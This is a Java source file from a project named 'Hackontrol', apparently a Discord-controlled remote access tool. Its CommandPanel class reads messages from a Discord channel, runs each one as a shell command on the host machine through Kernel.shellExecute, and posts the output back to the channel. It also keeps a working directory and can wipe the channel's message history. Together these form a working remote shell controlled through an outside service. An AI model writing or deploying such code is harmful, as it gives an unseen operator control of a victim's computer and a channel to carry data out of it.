package com.khopan.hackontrol.panel;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.library.Kernel;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageHistory;

public class CommandPanel extends Panel {
	private static final String PANEL_NAME = "command";

	private static File CurrentDirectory;
	private static int ThreadCount;

	static {
		try {
			CommandPanel.CurrentDirectory = File.listRoots()[0];
		} catch(Throwable Errors) {
			CommandPanel.CurrentDirectory = null;
		}
	}

	@Override
	public String panelName() {
		return CommandPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.MESSAGE_RECEIVED_EVENT, Event -> {
			if(Event.getAuthor().isBot() || Event.getChannel().getIdLong() != this.channel.getIdLong()) {
				return;
			}

			String command = Event.getMessage().getContentDisplay().trim();
			int length = command.length();

			if(command.startsWith("cls ") || command.startsWith("clear ") || (command.startsWith("cls") && length == 3) || (command.startsWith("clear") && length == 5)) {
				MessageHistory.getHistoryFromBeginning(this.channel).queue(history -> {
					List<Message> messageList = new ArrayList<>();
					history.getRetrievedHistory().forEach(messageList :: add);
					this.channel.deleteMessages(messageList).queue();
				});

				return;
			}

			if(command.startsWith("cd ") || (command.startsWith("cd") && length == 2)) {
				if(command.length() == 2) {
					String directory = CommandPanel.CurrentDirectory == null ? "SYSTEMROOT" : CommandPanel.CurrentDirectory.getAbsolutePath();
					this.channel.sendMessage('`' + directory + '`').queue();
					return;
				}

				command = command.substring(3).trim();

				if(command.isEmpty()) {
					this.channel.sendMessage("`Command input is empty`").queue();
					return;
				}

				File file = new File(command);

				if(!file.exists()) {
					this.channel.sendMessage("`The system cannot find the path specified.`").queue();
					return;
				}

				if(!file.isDirectory()) {
					this.channel.sendMessage("`The directory name is invalid.`").queue();
					return;
				}

				CommandPanel.CurrentDirectory = file;
				this.channel.sendMessage('`' + file.getAbsolutePath() + '`').queue();
				return;
			}

			String finalCommand = command;
			Thread thread = new Thread(() -> {
				try {
					this.process(finalCommand);
				} catch(Throwable Errors) {
					HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
				}

				CommandPanel.ThreadCount--;
			});

			thread.setName("Hackontrol Command Processor Thread #" + (++CommandPanel.ThreadCount));
			thread.setPriority(4);
			thread.start();
		});
	}

	private void process(String command) throws Throwable {
		Kernel.shellExecute(command, response -> {
			StringBuilder builder = new StringBuilder();
			String[] parts = response.split("\n");
			int count = 0;

			for(int i = 0; i < parts.length; i++) {
				String part = parts[i].replaceAll("\r|\n", "");

				if(part.isEmpty()) {
					continue;
				}

				if(count != 0) {
					builder.append('\n');
				}

				builder.append('`');
				builder.append(part);
				builder.append('`');
				count++;
			}

			this.channel.sendMessage(builder.toString()).queue();
		});
	}
}
